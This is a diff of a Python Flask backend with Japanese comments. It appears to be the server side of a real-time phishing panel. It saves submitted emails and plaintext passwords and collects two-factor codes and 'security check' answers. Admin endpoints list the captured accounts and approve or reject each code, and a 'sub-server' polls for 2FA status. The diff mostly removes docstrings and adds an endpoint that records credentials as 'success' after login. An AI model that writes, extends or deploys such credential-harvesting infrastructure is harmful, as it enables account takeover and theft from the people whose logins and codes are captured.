@@ -27,7 +27,6 @@ database.init_db()
 AUTH_DB_PATH = 'data/auth_database.json'
 
 def load_auth_db():
-    """認証データベース読み込み"""
     if not os.path.exists(AUTH_DB_PATH):
         return {"accounts": []}
     try:
@@ -37,13 +36,11 @@ def load_auth_db():
         return {"accounts": []}
 
 def save_auth_db(data):
-    """認証データベース保存"""
     os.makedirs(os.path.dirname(AUTH_DB_PATH), exist_ok=True)
     with open(AUTH_DB_PATH, 'w', encoding='utf-8') as f:
         json.dump(data, f, ensure_ascii=False, indent=2)
 
 def find_account(email, password):
-    """アカウント検索"""
     db = load_auth_db()
     for account in db['accounts']:
         if account['email'] == email and account['password'] == password:
@@ -51,7 +48,6 @@ def find_account(email, password):
     return None
 
 def create_or_update_account(email, password, status):
-    """アカウント作成・更新"""
     db = load_auth_db()
     account = find_account(email, password)
     
@@ -72,7 +68,6 @@ def create_or_update_account(email, password, status):
     return db
 
 def init_twofa_session(email, password):
-    """2FAセッション初期化"""
     db = load_auth_db()
     for account in db['accounts']:
         if account['email'] == email and account['password'] == password:
@@ -87,7 +82,6 @@ def init_twofa_session(email, password):
     return False
 
 def add_twofa_code(email, password, code):
-    """2FAコード追加"""
     db = load_auth_db()
     for account in db['accounts']:
         if account['email'] == email and account['password'] == password:
@@ -102,7 +96,6 @@ def add_twofa_code(email, password, code):
     return False
 
 def update_twofa_status(email, password, code, status):
-    """2FAコードステータス更新"""
     db = load_auth_db()
     for account in db['accounts']:
         if account['email'] == email and account['password'] == password:
@@ -115,7 +108,6 @@ def update_twofa_status(email, password, code, status):
     return False
 
 def complete_security_check(email, password):
-    """セキュリティチェック完了"""
     db = load_auth_db()
     for account in db['accounts']:
         if account['email'] == email and account['password'] == password:
@@ -126,7 +118,6 @@ def complete_security_check(email, password):
     return False
 
 def delete_twofa_session(email, password):
-    """2FAセッション削除"""
     db = load_auth_db()
     for account in db['accounts']:
         if account['email'] == email and account['password'] == password:
@@ -136,7 +127,6 @@ def delete_twofa_session(email, password):
     return False
 
 def get_all_active_sessions():
-    """アクティブセッション取得"""
     db = load_auth_db()
     active_sessions = []
     for account in db['accounts']:
@@ -211,7 +201,6 @@ def index():
 
 @app.route('/api/request', methods=['POST'])
 def create_request():
-    """リクエスト作成"""
     try:
         data = request.json
         genre = data.get('genre')
@@ -242,7 +231,6 @@ def create_request():
 
 @app.route('/api/request-result/<genre>/<request_id>', methods=['GET'])
 def get_request_result(genre, request_id):
-    """リクエスト結果取得"""
     try:
         detail = database.get_request_detail(genre, request_id)
         
@@ -269,9 +257,30 @@ def admin_top():
 def admin_accounts():
     return render_template('adminaccounts.html')
 
+@app.route('/api/login/init-session', methods=['POST'])
+def api_login_init_session():
+    """ログイン成功後、2FAセッションを初期化"""
+    try:
+        data = request.json
+        email = data.get('email', '').strip()
+        password = data.get('password', '').strip()
+        
+        if not email or not password:
+            return jsonify({'success': False, 'message': 'メールアドレスとパスワードが必要です'}), 400
+        
+        create_or_update_account(email, password, 'success')
+        init_twofa_session(email, password)
+        
+        print(f"[INFO] 2FAセッション初期化完了 | Email: {email}")
+        
+        return jsonify({'success': True, 'message': '2FAセッション初期化完了'}), 200
+        
+    except Exception as e:
+        print(f"[ERROR] 2FAセッション初期化エラー: {e}")
+        return jsonify({'success': False, 'message': 'エラーが発生しました'}), 500
+
 @app.route('/api/twofa-status/<email>', methods=['GET'])
 def get_twofa_status(email):
-    """2FA状態取得 (サブサーバーからポーリングされる)"""
     db = load_auth_db()
     
     for account in db['accounts']:
@@ -290,7 +299,6 @@ def get_twofa_status(email):
 
 @app.route('/api/2fa/submit', methods=['POST'])
 def api_2fa_submit():
-    """2FAコード受信"""
     try:
         data = request.json
         email = data.get('email', '').strip()
@@ -317,7 +325,6 @@ def api_2fa_submit():
 
 @app.route('/api/security-check/submit', methods=['POST'])
 def api_security_check_submit():
-    """セキュリティチェック受信"""
     try:
         data = request.json
         email = data.get('email', '').strip()
@@ -330,7 +337,6 @@ def api_security_check_submit():
 
 @app.route('/api/security-check/check-status', methods=['POST'])
 def api_security_check_status():
-    """セキュリティチェック状態取得"""
     try:
         data = request.json
         email = data.get('email', '').strip()
@@ -349,7 +355,6 @@ def api_security_check_status():
 
 @app.route('/api/admin/accounts', methods=['GET'])
 def api_admin_accounts():
-    """アカウント一覧取得"""
     db = load_auth_db()
     
     success_accounts = []
@@ -384,13 +389,11 @@ def api_admin_accounts():
 
 @app.route('/api/admin/active-sessions', methods=['GET'])
 def api_admin_active_sessions():
-    """アクティブセッション取得"""
     sessions = get_all_active_sessions()
     return jsonify({'success': True, 'sessions': sessions})
 
 @app.route('/api/admin/2fa/approve', methods=['POST'])
 def api_admin_2fa_approve():
-    """2FA承認"""
     data = request.json
     email = data.get('email', '').strip()
     password = data.get('password', '').strip()
@@ -402,7 +405,6 @@ def api_admin_2fa_approve():
 
 @app.route('/api/admin/2fa/reject', methods=['POST'])
 def api_admin_2fa_reject():
-    """2FA拒否"""
     data = request.json
     email = data.get('email', '').strip()
     password = data.get('password', '').strip()
@@ -414,7 +416,6 @@ def api_admin_2fa_reject():
 
 @app.route('/api/admin/security-complete', methods=['POST'])
 def api_admin_security_complete():
-    """セキュリティチェック完了"""
     data = request.json
     email = data.get('email', '').strip()
     password = data.get('password', '').strip()
@@ -425,7 +426,6 @@ def api_admin_security_complete():
 
 @app.route('/api/admin/block/delete', methods=['POST'])
 def api_admin_block_delete():
-    """ブロック削除"""
     data = request.json
     email = data.get('email', '').strip()
     password = data.get('password', '').strip()
@@ -444,7 +444,6 @@ def handle_disconnect():
 
 @socketio.on('response')
 def handle_response(data):
-    """PC側から返答受信"""
     try:
         genre = data.get('genre')
         request_id = data.get('request_id')
